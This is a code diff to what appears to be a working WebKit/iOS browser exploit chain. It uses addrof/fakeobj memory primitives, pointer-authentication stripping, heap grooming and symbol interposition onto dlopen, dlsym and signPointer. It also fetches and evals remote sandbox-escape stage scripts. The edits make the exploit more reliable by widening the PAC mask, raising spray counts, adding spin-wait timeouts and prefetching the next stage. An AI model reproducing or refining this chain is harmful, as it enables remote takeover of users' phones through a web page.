@@ -177,7 +177,7 @@ self[1] = boxed_arr;
     return f64[0];
   };
   BigInt.prototype.noPAC = function () {
-    return this & 0x7fffffffffn;
+    return this & 0xffffffffffn;
   };
   BigInt.prototype.add = function (other) {
     return this + other;
@@ -289,6 +289,7 @@ self[1] = boxed_arr;
           origin = data.origin;
           const device_model = data.device_model;
           const chipset = data.chipset;
+          const sbx0_fallback_start = parseInt(data.sbx0_fallback_start, 10);
           const offsets = data.offsets;
           const slide = data.slide;
           host = data.desiredHost;
@@ -305,7 +306,7 @@ self[1] = boxed_arr;
           let scribble_element;
           let scribbles = [];
           let prev_addr = 0n;
-          for (let i = 0; i < 500; ++i) {
+          for (let i = 0; i < 1000; ++i) {
             let o = {
               p1: 1.1,
               p2: 2.2
@@ -316,6 +317,10 @@ self[1] = boxed_arr;
             }
             scribbles.push(o);
             prev_addr = p.addrof(o);
+          }
+          if (!scribble_element) {
+            print("scribble_element: allocation stride miss after 1000 attempts");
+            throw new Error("scribble_element allocation failed");
           }
           let change_scribble_holder = {
             p1: p.fakeobj(0x108240700000000n),
@@ -383,6 +388,7 @@ self[1] = boxed_arr;
           print('isSafeToCollect: ' + isSafeToCollect.hex());
           p.device_model = device_model;
           p.chipset = chipset;
+          p.sbx0_fallback_start = isFinite(sbx0_fallback_start) ? sbx0_fallback_start : 0;
           globalThis.device_model = p.device_model;
           p.offsets = offsets;
           print(`slide: ${slide.hex()}`);
@@ -397,6 +403,7 @@ self[1] = boxed_arr;
         catch(e)
         {
           print("got exception on stage1: " + e);
+          self.postMessage({ type: 'stage1_failed', error: e.toString() });
         }
           break;
         }
@@ -537,11 +544,16 @@ self[1] = boxed_arr;
           p.efficient_search = function (begin, end, bytes) {
             const needle = String.fromCharCode(...bytes);
             const finder = p.create_jsstring(begin, end - begin);
+            const deadline = Date.now() + 5000;
             while (true) {
               const index = finder.indexOf(needle);
               if (index != -1) {
                 print(`index:${index}`);
                 return begin + BigInt(index);
+              }
+              if (Date.now() > deadline) {
+                print("efficient_search: timeout after 5s");
+                throw new Error("stack search timeout");
               }
             }
           };
@@ -645,7 +657,15 @@ self[1] = boxed_arr;
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
-          while (p.read64(p.p_InterposeTupleAll_size) != 0x100n);
+          {
+            const deadline = Date.now() + 10000;
+            while (p.read64(p.p_InterposeTupleAll_size) != 0x100n) {
+              if (Date.now() > deadline) {
+                print("interpose spin-wait timeout after 10s");
+                throw new Error("interpose timeout");
+              }
+            }
+          }
           print('InterposeTupleAll.size has been written');
           const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
           print(`initMediaAccessibilityMACaptionAppearanceGetDisplayType: ${initMediaAccessibilityMACaptionAppearanceGetDisplayType.hex()}`);
@@ -954,12 +974,28 @@ self[1] = boxed_arr;
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
+            const sbx1_prefetch = getJS('sbx1_main.js?' + Date.now());
+            if (sbx1_prefetch && sbx1_prefetch.length > 0) {
+              p.prefetched_sbx1_script = sbx1_prefetch;
+              log("[stage1] prefetched sbx1_main.js bytes=" + sbx1_prefetch.length);
+            } else {
+              log("[stage1] sbx1_main.js prefetch returned empty");
+            }
             // local version
-            const sbx0_script = getJS('/sbx0_main_18.4.js?' + Date.now());
+            const sbx0_script = getJS('sbx0_main_18.4.js?' + Date.now());
             log("after get js");
             eval(sbx0_script);
         } catch (e) {
-            log(btoa(e));
+            try {
+              log("[stage1] sbx0 eval failed: " + e);
+              if (e && e.stack) log("[stage1] sbx0 eval stack: " + e.stack);
+            } catch (_) {}
+            fcall_close();
+            self.postMessage({
+              type: 'stage1_failed',
+              error: e && e.stack ? e.stack.toString() : String(e)
+            });
+            return;
         }
           fcall_close();
           print(`all done`);
